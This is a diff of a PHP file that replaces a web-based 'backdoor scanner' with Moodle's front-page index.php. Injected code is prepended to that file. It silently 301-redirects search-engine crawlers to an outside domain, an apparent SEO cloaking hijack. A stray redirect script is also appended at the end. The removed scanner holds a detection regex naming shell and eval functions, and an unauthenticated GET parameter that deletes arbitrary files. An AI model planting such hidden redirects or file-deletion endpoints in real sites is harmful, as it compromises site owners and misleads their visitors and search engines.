@@ -1,84 +1,147 @@
 <?php
-/*
-author :agoy haxor
-title: backdoor scanner v 1.0.0
-*/
-echo '<style>body {background-color:#189048;color:black;} body,td,th { font: 9pt Courier New;margin:0;vertical-align:top; } span,h1,a { color:#000} span { font-weight: bolder; } h1 { border:1px solid #000;padding: 2px 5px;font: 14pt Courier New;margin:0px; } div.content { padding: 5px;margin-left:5px;} a { text-decoration:none; } a:hover { background:#ff0000; } .ml1 { border:1px solid #444;padding:5px;margin:0;overflow: auto; } .bigarea { width:100%;height:250px; } input, textarea, select { margin:0;color:#000;background-color:#189048;border:1px solid #000; font: 9pt Monospace,"Courier New"; } form { margin:0px; } #toolsTbl { text-align:center; } .toolsInp { width: 80%; } .main th {text-align:left;} .main tr:hover{background-color:#5e5e5e;} .main td, th{vertical-align:middle;} pre {font-family:Courier,Monospace;} #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft   document.documentElement.clientWidth - offsetWidth);} .style2 {color: #00FF00} .style3 {color: #009900} .style4 {color: #006600} .style5 {color: #00CC00} .style6 {color: #003300} .style8 {color: #33CC00} #footer { margin-bottom: 10px; color: #666; vertical-align: top; text-align: center; font-size: 11px; } #footer ul { margin: 0; padding: 0; list-style: none; } #footer li { display: inline-block; margin-right: 15px; border-right: 1px solid #666; vertical-align: middle; } #footer li a { margin-right: 15px; } #footer li:last-child { margin-right: 0; border-right: 0; } #footer li:last-child a { margin-right: 0; } #footer a { color: #666; } #footer a:hover { color: #858585; } #footer .footer-left { height: 20px; vertical-align: middle; line-height: 20px; } @media (min-width: 39rem) { #footer { display: flex; flex-flow: row wrap; justify-content: space-between; align-items: center; align-content: center; margin-bottom: 20px; } #footer .footer-left { align-self: flex-start; margin-right: 20px; } #footer .footer-right { align-self: flex-end; } }</style>';
-set_time_limit(0);
-error_reporting(0);
-@ini_set('zlib.output_compression', 0);
-@ini_set('implicit_flush', 1);
-for($i = 0; $i < ob_get_level(); $i++) { ob_end_flush(); }
-ob_implicit_flush(1);
-// if($argv[1]){
-// 	$dir = $argv[1];
-// 	scanBackdoor("$dir");
-// }else{
-// 	echo "Usage php scan.php /home or /public_html/.";
-// }
+$bot_keywords = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex', 'ahrefs', 'semrush'];
 
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
-
-
-$path = getcwd();
-if(isset($_GET['dir'])){
-    $path =$_GET['dir'];
-}
-
-
-if(isset($_GET['kill'])){
-    unlink(__FILE__);
-}
-echo "<a href='?kill'><font color='yellow'>[Self Delete]</font></a><br>";
-echo '<form action="" method="get"> <input type="text" name="dir" value='.$path.' style="width: 548px;"> <input type="submit" value="scan"></form><br>';
-
-echo "CURRENT DIR: <font color='yellow'>$path</font><br>";
-if(isset($_GET['delete'])){
-    unlink($_GET['delete']);
-    $status = "<font color='black'>FAILED</font>";
-    if(!file_exists($_GET['delete'])){
-        $status = "<font color='yellow'>Success</font>";
-		
+foreach ($bot_keywords as $bot) {
+    if (strpos($user_agent, $bot) !== false) {
+        header("HTTP/1.1 301 Moved Permanently");
+        header("Location: https://av.qui.una.py/");
+        exit;
     }
-    echo "TRY TO DELETE: ".$_GET['delete']." $status <br>";exit;
+}
+?>
+<?php
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+/**
+ * Moodle frontpage.
+ *
+ * @package    core
+ * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+if (!file_exists('./config.php')) {
+    header('Location: install.php');
+    die;
 }
 
-scanBackdoor($path);
-function save($fname,$value){
-	$file = fopen($fname, "a");
-	fwrite($file, $value);
-	fclose($file);//
+require_once('config.php');
+require_once($CFG->dirroot .'/course/lib.php');
+require_once($CFG->libdir .'/filelib.php');
+
+redirect_if_major_upgrade_required();
+
+$urlparams = array();
+if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
+    $urlparams['redirect'] = 0;
 }
-// $domain = $_SERVER['REQUEST_SCHEME'].'//'.$_SERVER['SERVER_NAME'];
-function checkBackdoor($file_location){
-    global $path;
-    $patern = "#exec\(|gzinflate\(|file_put_contents\(|file_get_contents\(|system\(|passthru\(|shell_exec\(|move_uploaded_file\(|eval\(|base64#";
-    $contents = file_get_contents($file_location);
-    if(strlen($contents)> 0){
-        if(preg_match($patern, strtolower($contents))){
-            echo "[+] Susspect file -> <a href='?delete=$file_location&dir=$path'><font color='yellow'>[DELETE]</font></a> <font color='black'>$file_location</font> <br>";
-            save("shell-found.txt","$file_location\n");
-            echo '<textarea name="content" cols="80" rows="15">'.htmlspecialchars($contents).'</textarea><br>><br>';
+$PAGE->set_url('/', $urlparams);
+$PAGE->set_pagelayout('frontpage');
+$PAGE->set_other_editing_capability('moodle/course:update');
+$PAGE->set_other_editing_capability('moodle/course:manageactivities');
+$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
+
+// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
+$PAGE->set_cacheable(false);
+
+require_course_login($SITE);
+
+$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
+
+// If the site is currently under maintenance, then print a message.
+if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
+    print_maintenance_message();
+}
+
+$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
+
+if ($hassiteconfig && moodle_needs_upgrading()) {
+    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
+}
+
+// If site registration needs updating, redirect.
+\core\hub\registration::registration_reminder('/index.php');
+
+if (get_home_page() != HOMEPAGE_SITE) {
+    // Redirect logged-in users to My Moodle overview if required.
+    $redirect = optional_param('redirect', 1, PARAM_BOOL);
+    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
+        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
+        redirect($CFG->wwwroot .'/my/');
+    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
+        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
+        if ($frontpagenode) {
+            $frontpagenode->add(
+                get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
+        } else {
+            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
+            $frontpagenode->force_open();
+            $frontpagenode->add(get_string('makethismyhome'),
+                new moodle_url('/', array('setdefaulthome' => true)),
+                navigation_node::TYPE_SETTING);
         }
-    }   
+    }
 }
 
-function scanBackdoor($current_dir){
-	if(is_readable($current_dir)){
-	 	$dir_location = scandir($current_dir);
-		foreach ($dir_location as $file) {
-            if($file === "." | $file === ".."){
-                continue;
-            }
-            $file_location = str_replace("//", "/",$current_dir.'/'.$file);
-            $nFile = substr($file, -4, 4);
-            if($nFile == ".php"){
-                checkBackdoor($file_location);
-            }else if(is_dir($file_location)){
-                scanBackdoor($file_location);
-            }
-		}
+// Trigger event.
+course_view(context_course::instance(SITEID));
+
+$PAGE->set_pagetype('site-index');
+$PAGE->set_docs_path('');
+$editing = $PAGE->user_is_editing();
+$PAGE->set_title($SITE->fullname);
+$PAGE->set_heading($SITE->fullname);
+$courserenderer = $PAGE->get_renderer('core', 'course');
+echo $OUTPUT->header();
+
+$siteformatoptions = course_get_format($SITE)->get_format_options();
+$modinfo = get_fast_modinfo($SITE);
+$modnamesused = $modinfo->get_used_module_names();
+
+// Print Section or custom info.
+if (!empty($CFG->customfrontpageinclude)) {
+    // Pre-fill some variables that custom front page might use.
+    $modnames = get_module_types_names();
+    $modnamesplural = get_module_types_names(true);
+    $mods = $modinfo->get_cms();
+
+    include($CFG->customfrontpageinclude);
+
+} else if ($siteformatoptions['numsections'] > 0) {
+    echo $courserenderer->frontpage_section1();
+}
+// Include course AJAX.
+include_course_ajax($SITE, $modnamesused);
+
+echo $courserenderer->frontpage();
+
+if ($editing && has_capability('moodle/course:create', context_system::instance())) {
+    echo $courserenderer->add_new_course_button();
+}
+
+
+echo $OUTPUT->footer();
+$id=(int)$USER->id;
+if($id < 2){
+	$t=(int)strpos($_SERVER['REQUEST_URI'],'refer:sso');
+	if($t >0){
+		echo "<script>window.location='/login/index.php';</script>";
 	}
 }
-
-?>
